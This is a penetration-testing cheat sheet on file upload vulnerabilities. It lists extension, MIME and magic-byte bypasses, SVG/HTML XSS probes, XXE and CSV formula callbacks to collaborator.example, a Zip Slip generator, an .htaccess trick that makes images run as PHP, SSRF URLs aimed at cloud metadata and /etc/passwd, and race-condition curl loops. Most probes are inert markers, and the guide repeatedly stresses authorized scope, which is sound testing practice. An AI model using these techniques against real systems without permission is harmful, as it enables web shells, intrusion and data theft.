# File Upload

## Introduction

File Upload vulnerabilities happen when an application lets a user upload a file that can later be abused.

Impact depends on where the file lands, how it is validated, how it is stored, and how it is later processed.

Typical impact:

| Type                     | Meaning                                      | Typical Impact                       |
| ------------------------ | -------------------------------------------- | ------------------------------------ |
| Unrestricted Upload      | Dangerous file type accepted                 | Web shell, RCE, defacement           |
| Extension Bypass         | Filter can be bypassed with filename tricks  | Server-side execution                |
| Content-Type Bypass      | Backend trusts user-controlled MIME header   | Dangerous file accepted              |
| Magic Byte Bypass        | Backend only checks file header              | Polyglot / fake image upload         |
| Path Traversal in Upload | Filename or path controls destination        | Arbitrary file write                 |
| Upload + LFI             | Uploaded file is included later              | RCE through LFI                      |
| Client-Side Payload      | File is served to users                      | Stored XSS, HTML injection, phishing |
| Parser Exploit           | File is processed by image/PDF/video library | SSRF, XXE, RCE, metadata leaks       |
| Archive Abuse            | ZIP/TAR extraction is unsafe                 | Zip Slip, overwrite, file planting   |

---

## Useful Resources

* PortSwigger — File Upload Vulnerabilities
* HackTricks — File Upload
* PayloadsAllTheThings — Upload Insecure Files
* OWASP WSTG — Test Upload of Unexpected File Types
* OWASP WSTG — Test Upload of Malicious Files
* SecLists — Web Content, MIME types, LFI payloads
* Burp Suite — Repeater, Intruder, Logger, Collaborator
* Fuxploider
* ZAP FileUpload add-on

---

## Basic Mental Model

Most file upload testing is about answering eight questions:

1. Where can I upload files?
2. Which field controls the filename?
3. Which field controls the destination path?
4. Which file types are accepted?
5. Is validation based on extension, MIME type, magic bytes, file content, or server-side processing?
6. Where is the file stored?
7. Can I access the uploaded file directly?
8. Is the uploaded file served, parsed, included, converted, extracted, or executed?

A vulnerable flow often looks like this:

```php
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
```

High-impact condition:

```text
attacker-controlled file bytes + attacker-controlled filename + web-accessible executable directory
```

---

## Where to Test

Test every place where the application accepts files or file-like content.

| Location               | Examples                                    |
| ---------------------- | ------------------------------------------- |
| Profile upload         | avatar, logo, profile picture               |
| Attachments            | tickets, chat, CRM, support case            |
| CMS/media library      | images, documents, themes                   |
| Import features        | CSV, XML, JSON, Excel, ZIP                  |
| Document generation    | DOCX, PDF, templates                        |
| Image processing       | resize, crop, thumbnail, metadata           |
| Video/audio processing | transcoding, preview generation             |
| Archive upload         | ZIP, TAR, 7Z, plugin/theme package          |
| API upload             | multipart, base64, presigned URL            |
| Mobile/API backend     | direct object storage upload                |
| Admin panels           | plugin upload, theme upload, backup restore |
| WYSIWYG editor         | image/file insert                           |
| Markdown/HTML input    | remote image fetch, embedded files          |
| URL upload             | import from URL, fetch remote file          |
| PUT endpoints          | WebDAV, REST upload routes                  |

---

## High-Value Parameter Names

```text
file
upload
image
img
avatar
photo
picture
logo
document
doc
attachment
media
import
backup
restore
template
theme
plugin
module
filename
name
path
folder
dir
destination
target
url
remote
data
content
base64
```

---

## Baseline Workflow

1. Capture the normal upload request in Burp.
2. Upload a harmless text marker first.

```text
upload_probe_73921
```

3. Check the response for:

   * saved filename
   * public URL
   * internal path
   * object key
   * bucket name
   * CDN URL
   * image dimensions
   * thumbnail URL
   * error messages
   * extension validation messages
   * MIME validation messages

4. Visit the uploaded file directly.

5. Check whether the file is:

   * downloaded
   * rendered inline
   * executed
   * renamed
   * converted
   * compressed
   * resized
   * stripped
   * moved
   * scanned
   * deleted

6. Change one property at a time:

   * extension
   * Content-Type
   * magic bytes
   * filename characters
   * file size
   * multipart field name
   * path separators
   * metadata

7. Compare response code, response length, stored name, and later file behavior.

---

## First Probe Files

### Text Marker

```text
upload_probe_73921
```

Filename ideas:

```text
probe.txt
probe.jpg
probe.png
probe.pdf
```

### Minimal HTML Probe

```html
<h1>upload_probe_73921</h1>
```

Filename ideas:

```text
probe.html
probe.htm
probe.svg
```

### SVG Probe

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">upload_probe_73921</text>
</svg>
```

Filename:

```text
probe.svg
```

### Minimal Valid PNG Header Marker

```bash
printf '\x89PNG\r\n\x1a\nupload_probe_73921' > probe.png
```

---

## Upload Response Signals

| Signal                            | Meaning                                         |
| --------------------------------- | ----------------------------------------------- |
| Original filename preserved       | Filename manipulation may be possible           |
| Full path leaked                  | Useful for LFI/path traversal chaining          |
| Public URL returned               | Direct access possible                          |
| CDN/object key returned           | Test object storage behavior                    |
| Extension changed                 | Backend normalization exists                    |
| Image resized                     | Payload may need to survive processing          |
| File downloaded                   | Less likely server-side execution, still useful |
| File rendered inline              | Client-side payloads may work                   |
| File executes                     | High-impact RCE path                            |
| Same filename overwrites old file | Overwrite risk                                  |
| Path separators accepted          | File write/path traversal risk                  |
| ZIP extracted                     | Archive traversal/parser testing                |
| Async processing                  | Race conditions possible                        |

---

## Dangerous Extensions

### PHP

```text
.php
.php3
.php4
.php5
.php7
.phtml
.pht
.phtm
.phar
.phps
.inc
```

### ASP / ASP.NET / IIS

```text
.asp
.aspx
.ashx
.asmx
.ascx
.config
.cer
.asa
.soap
```

### JSP / Java

```text
.jsp
.jspx
.jsw
.jsv
.jspf
.do
.action
.actions
```

### Perl / CGI

```text
.pl
.pm
.cgi
.lib
```

### ColdFusion

```text
.cfm
.cfml
.cfc
.dbm
```

### Node / JavaScript

```text
.js
.json
.node
```

### Client-Side / Parser-Relevant

```text
.html
.htm
.svg
.xml
.xhtml
.mht
.swf
.csv
.xls
.xlsx
.docx
.pdf
.zip
tar
tar.gz
7z
avi
mp4
```

---

## Extension Bypass

### Double Extension

```text
shell.jpg.php
shell.png.php
shell.gif.php
shell.pdf.php
shell.php.jpg
shell.php.png
shell.php.gif
```

### Case Variation

```text
shell.pHp
shell.PHP
shell.PhP5
shell.PHTML
shell.PhAr
```

### Trailing Dot / Space

```text
shell.php.
shell.php..
shell.php...
shell.php%20
shell.php%2e
shell.php%2e%20
```

### Null Byte Legacy

```text
shell.php%00.jpg
shell.php%00.png
shell.php\x00.jpg
```

### Slash / Path Confusion

```text
shell.php/
shell.php/.
shell.php/./
shell.php%2f
shell.php%5c
shell.j%2fsp
shell.j%5csp
```

### Newline / CRLF

```text
shell.php%0a.jpg
shell.php%0d%0a.jpg
shell.php%09.jpg
```

### RTLO Filename Trick

```text
name.%E2%80%AEphp.jpg
```

Visual idea:

```text
name.gpj.php
```

### Long Filename Truncation

Useful when the backend truncates filenames after validation.

```bash
python3 - <<'PY'
print("A" * 240 + ".php.jpg")
PY
```

Test variants:

```text
AAAAAAAA...[240]...AAAA.php.jpg
AAAAAAAA...[240]...AAAA.jsp.png
AAAAAAAA...[240]...AAAA.aspx.gif
```

---

## MIME / Content-Type Bypass

Some applications trust the multipart `Content-Type` header.

Try changing only the file part Content-Type:

```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png
```

Common values:

```text
image/png
image/jpeg
image/gif
text/plain
application/octet-stream
application/pdf
multipart/form-data
application/x-php
```

Burp workflow:

1. Send upload request to Repeater.
2. Keep filename dangerous.
3. Change only the file part `Content-Type`.
4. Compare response.
5. If accepted, visit uploaded path.
6. Check whether server executes or downloads the file.

---

## Magic Byte Bypass

Some applications check only the first bytes of the file.

### GIF

```text
GIF89a
upload_probe_73921
```

### PNG

```bash
printf '\x89PNG\r\n\x1a\nupload_probe_73921' > probe.png
```

### JPEG

```bash
printf '\xff\xd8\xff\xe0upload_probe_73921' > probe.jpg
```

### PDF

```text
%PDF-1.3
upload_probe_73921
%%EOF
```

Test idea:

```text
valid magic bytes + dangerous extension
valid extension + dangerous content
valid magic bytes + dangerous content + dangerous extension
```

---

## Polyglot Ideas

A polyglot file is valid enough for one parser while still carrying payload content for another context.

Common targets:

| Polyglot                           | Use Case                                 |
| ---------------------------------- | ---------------------------------------- |
| GIF + PHP                          | Image header check bypass                |
| PNG + PHP                          | Image upload with weak magic-byte checks |
| JPEG + PHP metadata                | EXIF/comment payload                     |
| SVG + JavaScript                   | Stored XSS / SSRF / XML behavior         |
| PDF + JavaScript/HTML-like content | Client-side or parser behavior           |
| ZIP + PHP                          | Archive extraction / parser confusion    |
| DOCX/XLSX + XML                    | XXE or macro-adjacent workflows          |

Harmless marker example:

```text
GIF89a
<?php echo "upload_probe_73921"; ?>
```

Use server-side payloads only when the engagement scope explicitly allows code execution testing.

---

## Image Metadata Payloads

Check whether metadata survives upload processing.

### Add EXIF Comment

```bash
exiftool -Comment="upload_probe_73921" image.jpg
```

### Read Metadata Back

```bash
exiftool uploaded.jpg
```

Useful if:

```text
metadata is rendered in HTML
metadata is stored in database
metadata is copied into thumbnails
metadata reaches admin panel
metadata reaches PDF/export
metadata is later included by backend logic
```

---

## SVG Upload Testing

SVG is high-value because it is XML-based and often rendered by browsers or parsed server-side.

### Basic SVG Marker

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">upload_probe_73921</text>
</svg>
```

### SVG Script Probe

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

### SVG External Reference Probe

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="https://collaborator.example/upload_probe_73921.png" />
</svg>
```

Check for:

```text
stored XSS
admin-panel XSS
server-side fetch
PDF conversion callback
image proxy callback
XML parser errors
metadata extraction behavior
```

---

## HTML Upload Testing

If `.html` or `.htm` is accepted and served inline, test stored client-side execution.

```html
<!doctype html>
<html>
<body>
<h1>upload_probe_73921</h1>
<script>alert(document.domain)</script>
</body>
</html>
```

Interesting filenames:

```text
probe.html
probe.htm
probe.xhtml
probe.svg
```

Check whether the uploaded file is served with:

```text
text/html
image/svg+xml
application/xhtml+xml
text/plain
application/octet-stream
```

---

## CSV / Formula Injection Uploads

Useful when uploaded CSV/XLSX files are opened by staff or exported later.

Probe values:

```text
=1+1
=HYPERLINK("https://collaborator.example/csv_probe","click")
+1+1
-1+1
@SUM(1,1)
```

OAST-style probe:

```text
=WEBSERVICE("https://collaborator.example/csv_probe")
```

Check for:

```text
admin export
back-office spreadsheet processing
import error preview
data normalization
formula preservation
formula execution when opened
```

---

## XML / XXE Uploads

If XML upload is accepted or office documents are parsed server-side, test XML behavior.

### Harmless XML Marker

```xml
<?xml version="1.0"?>
<root>upload_probe_73921</root>
```

### OAST XXE Probe

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "https://collaborator.example/xxe_probe">
]>
<root>&xxe;</root>
```

Useful upload types:

```text
.xml
.svg
.docx
.xlsx
pptx
.odt
fodt
```

Check for:

```text
DNS callback
HTTP callback
XML parser error
file content reflected
import preview behavior
server-side conversion behavior
```

---

## Archive Upload Testing

Archive upload is useful for file planting, parser bugs, and path traversal during extraction.

### ZIP Marker

```bash
echo "upload_probe_73921" > probe.txt
zip probe.zip probe.txt
```

### Zip Slip Path Traversal

Create entries with traversal paths:

```text
../probe.txt
../../probe.txt
../../../var/www/html/probe.txt
../../../../tmp/probe.txt
```

Manual creation idea:

```bash
mkdir -p zipslip/a
echo "upload_probe_73921" > zipslip/a/probe.txt
zip -r normal.zip zipslip
```

For exact traversal entry names, use Python:

```python
import zipfile

with zipfile.ZipFile("zipslip.zip", "w") as z:
    z.writestr("../../../../tmp/upload_probe_73921.txt", "upload_probe_73921")
```

### Concatenated ZIP Parser Disagreement

```bash
zip benign.zip benign.txt
zip second.zip probe.txt
cat benign.zip second.zip > combined.zip
```

Check whether validation and extraction disagree.

### Archive Bomb / DoS Note

Archive bombs can cause service impact. Do not use high-compression or resource-exhaustion tests unless explicitly authorized.

---

## Path Traversal in Filename

Test whether the filename is used directly on the filesystem.

```text
../probe.txt
../../probe.txt
../../../probe.txt
../../../../tmp/probe.txt
..%2fprobe.txt
..%2f..%2fprobe.txt
..%5cprobe.txt
..%5c..%5cprobe.txt
```

Multipart example:

```http
Content-Disposition: form-data; name="file"; filename="../../../../tmp/probe.txt"
Content-Type: text/plain

upload_probe_73921
```

Check for:

```text
file stored outside upload folder
path leaked in response
different error for traversal
overwrite behavior
temporary file path exposure
LFI chain possibility
```

---

## Windows Filename Tricks

### Reserved Names

```text
CON
PRN
AUX
NUL
COM1
COM2
COM3
LPT1
LPT2
LPT3
```

### Trailing Dots and Spaces

```text
shell.asp.
shell.aspx.
shell.php.
file.txt.
file.txt 
```

### NTFS ADS

```text
shell.asp::$data
shell.aspx::$data
shell.php::$data
file.asp:.jpg
file.aspx:.jpg
```

### Invalid / Special Characters

```text
<
>
:
"
|
?
*
```

Check for:

```text
normalization
truncation
alternate stream behavior
extension confusion
unexpected created files
error leakage
```

---

## Server-Specific Upload Angles

### Apache + PHP

Interesting extensions:

```text
.php
.phtml
.phar
.pht
.php5
```

Apache may execute files based on handler mappings, not just final extension.

Test:

```text
shell.php.jpg
shell.jpg.php
shell.phtml
```

### IIS / ASP.NET

Interesting extensions:

```text
.asp
.aspx
.ashx
.asmx
.config
.cer
.asa
```

IIS legacy tricks:

```text
shell.aspx;.jpg
shell.asp;.jpg
shell.aspx::$data
```

### Tomcat / Java

Interesting extensions:

```text
.jsp
.jspx
.war
```

High-value upload/import functions:

```text
plugin upload
theme upload
WAR deployment
report template upload
document converter
```

### Nginx + PHP-FPM

Check for extension/path parsing confusion:

```text
shell.jpg/anything.php
shell.php.jpg
shell.jpg%00.php
```

Behavior depends heavily on routing and PHP-FPM configuration.

---

## Configuration File Uploads

Sometimes direct script upload is blocked, but configuration files are accepted or can be planted.

### Apache `.htaccess`

Filename:

```text
.htaccess
```

Payload idea:

```apache
AddType application/x-httpd-php .jpg
```

Then upload:

```text
shell.jpg
```

### IIS `web.config`

Filename:

```text
web.config
```

Use only in labs or when configuration-file execution testing is explicitly in scope.

---

## Upload + LFI Chain

If direct execution fails, combine upload with Local File Inclusion.

Flow:

1. Upload a file with a unique marker.
2. Identify the stored path.
3. Confirm LFI exists.
4. Include the uploaded file through LFI.
5. Check whether the content is interpreted by the backend.

Example path guesses:

```text
uploads/probe.txt
../uploads/probe.txt
../../uploads/probe.txt
/var/www/html/uploads/probe.txt
/tmp/phpXXXXXX
```

Example LFI trigger:

```text
/index.php?page=uploads/probe.txt
/index.php?page=../../uploads/probe.txt
```

---

## Upload + Path Disclosure

Upload errors often leak useful internals.

Trigger errors with:

```text
very long filename
invalid characters
unsupported extension
large file
empty file
duplicate filename
traversal filename
broken image
corrupt ZIP
```

Look for:

```text
absolute filesystem path
framework name
storage driver
temporary file path
image library
AV/scanner message
object storage bucket
CDN path
worker/job name
stack trace
```

---

## Upload + Object Storage

Modern apps often upload to S3/GCS/Azure Blob through presigned URLs.

Check:

```text
Can I control object key?
Can I overwrite another object?
Can I upload unexpected content type?
Can I set metadata?
Can I set public-read ACL?
Can I access file without authentication?
Can I use path traversal-like keys?
Can I upload HTML/SVG and render it from trusted domain?
Can I reuse presigned URL?
Can I change filename after signature generation?
```

Interesting object keys:

```text
probe.txt
../probe.txt
../../probe.txt
users/123/avatar.png
users/124/avatar.png
public/probe.html
static/probe.svg
```

Headers to inspect:

```text
Content-Type
Content-Disposition
x-amz-acl
x-amz-meta-*
x-goog-meta-*
x-ms-blob-type
```

---

## URL-Based Upload / Import

Some apps fetch a remote file from a URL.

Test:

```text
https://collaborator.example/upload_probe_73921.png
http://127.0.0.1/
http://localhost/
http://169.254.169.254/
file:///etc/passwd
gopher://127.0.0.1:80/
```

Check for:

```text
DNS callback
HTTP callback
internal service response
metadata service attempt
stored remote filename
redirect handling
content-type trust
extension trust from URL path
```

Filename confusion example:

```text
https://attacker.example/shell.php?.jpg
https://attacker.example/image.jpg/../shell.php
https://attacker.example/longname.php.jpg
```

---

## Race Conditions

Some upload flows validate or scan after writing the file.

Flow:

1. Upload candidate file.
2. Immediately request the saved URL repeatedly.
3. Check whether the file is briefly accessible before deletion/quarantine.
4. Use short, controlled tests only.

Race request loop:

```bash
while true; do
  curl -sk "https://target/uploads/probe.php" | grep upload_probe_73921 && break
done
```

Upload loop:

```bash
while true; do
  curl -sk -F "file=@probe.php;type=image/png" "https://target/upload" >/dev/null
done
```

Stop immediately after proof. Avoid high concurrency unless explicitly authorized.

---

## PUT Upload Testing

Some servers allow direct upload through HTTP PUT.

Check OPTIONS:

```bash
curl -i -X OPTIONS https://target/uploads/
```

Try harmless upload:

```bash
curl -i -X PUT https://target/uploads/probe.txt \
  --data-binary "upload_probe_73921"
```

Verify:

```bash
curl -i https://target/uploads/probe.txt
```

Try extension behavior only if in scope:

```bash
curl -i -X PUT https://target/uploads/probe.html \
  --data-binary '<h1>upload_probe_73921</h1>'
```

---

## Multipart Request Manipulation

### Change Filename Only

```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png
```

### Change Field Name

```http
Content-Disposition: form-data; name="avatar"; filename="probe.png"
```

Try alternate field names:

```text
file
files
upload
image
avatar
attachment
document
media
```

### Duplicate File Fields

```http
Content-Disposition: form-data; name="file"; filename="safe.jpg"

SAFE

Content-Disposition: form-data; name="file"; filename="shell.php"

PAYLOAD
```

### Duplicate Filename Parameters

```http
Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php"
```

### UTF-8 Filename

```http
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
```

Check parser differences between frontend proxy, framework, storage layer, and scanner.

---

## Client-Side Impact Files

Even without server-side execution, uploaded files can still be useful.

### Stored XSS

```text
.html
.svg
.xhtml
.xml
```

### Phishing / Trusted-Origin Abuse

```text
login.html
invoice.html
sso.html
support.html
```

### CSV Injection

```text
.csv
.xls
.xlsx
```

### Open Redirect / HTML Smuggling

```text
.html
.svg
.js
```

### Malware / Social Engineering

Only test this if explicitly allowed. Prefer inert proof files and markers.

---

## Parser / Converter Targets

Uploaded files may be processed by backend libraries.

| Processor         | Interesting Tests                                                      |
| ----------------- | ---------------------------------------------------------------------- |
| ImageMagick       | image parser behavior, SSRF-like fetches, old ImageTragick-style cases |
| Ghostscript       | PDF/PS processing behavior                                             |
| ExifTool          | metadata parser bugs                                                   |
| LibreOffice       | DOCX/XLSX/PPTX conversion                                              |
| FFmpeg            | media parsing, HLS/playlist behavior                                   |
| PDF generators    | HTML-to-PDF, local file fetch, SSRF                                    |
| Antivirus/sandbox | decompression, parser edge cases                                       |
| OCR engines       | image/PDF parsing                                                      |

Start with harmless callback/marker tests before any exploit-specific payload.

---

## Filename Collision / Overwrite

Test whether uploads overwrite existing files.

Flow:

1. Upload `probe.txt` with marker A.
2. Upload `probe.txt` again with marker B.
3. Fetch public URL.
4. Check whether marker A or B is served.

Commands:

```bash
echo "marker_A_73921" > probe.txt
curl -sk -F "file=@probe.txt" "https://target/upload"

echo "marker_B_73921" > probe.txt
curl -sk -F "file=@probe.txt" "https://target/upload"
```

Check for:

```text
overwrite
rename
deduplication
user-isolation failure
cross-tenant collision
predictable filename
predictable path
```

---

## File Size / Resource Testing

Use controlled sizes only.

```bash
dd if=/dev/zero of=1mb.bin bs=1M count=1
dd if=/dev/zero of=10mb.bin bs=1M count=10
```

Check:

```text
maximum size
chunked upload behavior
resume behavior
partial file exposure
temporary file cleanup
async scanner behavior
disk quota behavior
```

Avoid destructive storage exhaustion.

---

## Burp Intruder Wordlists

### Extension List

```text
php
php3
php4
php5
phtml
pht
phar
asp
aspx
ashx
asmx
jsp
jspx
war
html
htm
svg
xml
pdf
zip
```

### Content-Type List

```text
image/png
image/jpeg
image/gif
text/plain
text/html
application/pdf
application/octet-stream
application/x-php
application/xml
image/svg+xml
```

### Filename Mutation Pattern

```text
probe§EXT§
```

or:

```text
probe.§EXT§.jpg
```

---

## ffuf Testing

### Discover Upload Endpoints

```bash
ffuf -u https://target/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all
```

### Common Upload Paths

```bash
ffuf -u https://target/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc all
```

Interesting words:

```text
upload
uploads
files
media
assets
attachments
avatar
profile
import
backup
admin/upload
api/upload
```

### Find Uploaded File Path

```bash
ffuf -u https://target/uploads/FUZZ \
  -w filenames.txt \
  -mc all
```

---

## curl Upload Examples

### Basic Multipart Upload

```bash
curl -i -k \
  -F "file=@probe.txt" \
  https://target/upload
```

### Force MIME Type

```bash
curl -i -k \
  -F "file=@probe.php;type=image/png" \
  https://target/upload
```

### Custom Filename

```bash
curl -i -k \
  -F "file=@probe.txt;filename=shell.php" \
  https://target/upload
```

### Add Cookie

```bash
curl -i -k \
  -H "Cookie: session=SESSION_HERE" \
  -F "file=@probe.txt;filename=probe.jpg;type=image/jpeg" \
  https://target/upload
```

### JSON / Base64 Upload

```bash
base64 -w0 probe.txt
```

```bash
curl -i -k https://target/api/upload \
  -H "Content-Type: application/json" \
  -d '{"filename":"probe.txt","content":"BASE64_HERE"}'
```

---

## Fuxploider

Basic usage pattern:

```bash
fuxploider --url https://target/upload \
  --not-regex "error|invalid|not allowed"
```

Use with caution:

```text
scanner results need manual verification
uploaded payloads may leave files behind
authenticated flows usually need captured requests/cookies
production testing needs strict scope control
```

---

## Testing Checklist

### Discovery

- [ ] Identified every upload feature.
- [ ] Captured baseline upload request and response.
- [ ] Uploaded harmless marker file first.
- [ ] Found whether file is directly accessible.
- [ ] Identified storage path or public URL.
- [ ] Checked whether upload is synchronous or asynchronous.
- [ ] Checked whether uploaded files are renamed.
- [ ] Checked whether duplicate filenames overwrite.

### Validation Mapping

- [ ] Tested allowed extensions.
- [ ] Tested blocked extensions.
- [ ] Tested extension case sensitivity.
- [ ] Tested double extensions.
- [ ] Tested trailing dot/space.
- [ ] Tested MIME header manipulation.
- [ ] Tested magic-byte checks.
- [ ] Tested corrupt image behavior.
- [ ] Tested oversized file behavior.
- [ ] Tested duplicate multipart fields.
- [ ] Tested UTF-8 filename parsing.
- [ ] Tested traversal in filename.

### Server-Side Execution

- [ ] Identified backend stack where possible.
- [ ] Tested PHP-relevant extensions if PHP stack.
- [ ] Tested ASPX/ASHX-relevant extensions if IIS stack.
- [ ] Tested JSP/WAR-relevant extensions if Java stack.
- [ ] Checked whether uploaded file is downloaded or executed.
- [ ] Checked whether configuration files can alter execution behavior.
- [ ] Confirmed execution only with minimal proof and only when explicitly authorized.

### Client-Side Impact

- [ ] Tested HTML upload.
- [ ] Tested SVG upload.
- [ ] Tested CSV formula behavior.
- [ ] Checked whether files are served inline.
- [ ] Checked whether uploaded content is rendered in admin panel.
- [ ] Checked whether metadata appears in pages or exports.
- [ ] Checked trusted-origin impact.

### Parser / Processing

- [ ] Checked thumbnail generation.
- [ ] Checked image metadata preservation.
- [ ] Checked PDF/document conversion.
- [ ] Checked ZIP extraction.
- [ ] Checked media processing.
- [ ] Checked OAST callback behavior for parser fetches.
- [ ] Checked whether parser errors leak internal paths.

### Chaining

- [ ] Tested upload + LFI.
- [ ] Tested upload + path traversal.
- [ ] Tested upload + object storage key control.
- [ ] Tested upload + stored XSS.
- [ ] Tested upload + admin panel rendering.
- [ ] Tested upload + race condition.
- [ ] Tested upload + overwrite/collision.
- [ ] Tested upload + SSRF through URL import.

### Evidence

- [ ] Saved original request.
- [ ] Saved accepted upload request.
- [ ] Saved response showing filename/path/URL.
- [ ] Saved request proving file access.
- [ ] Saved screenshot or raw response proving impact.
- [ ] Used minimal marker or low-impact proof.
- [ ] Avoided broad exploitation unless the scope explicitly allowed it.
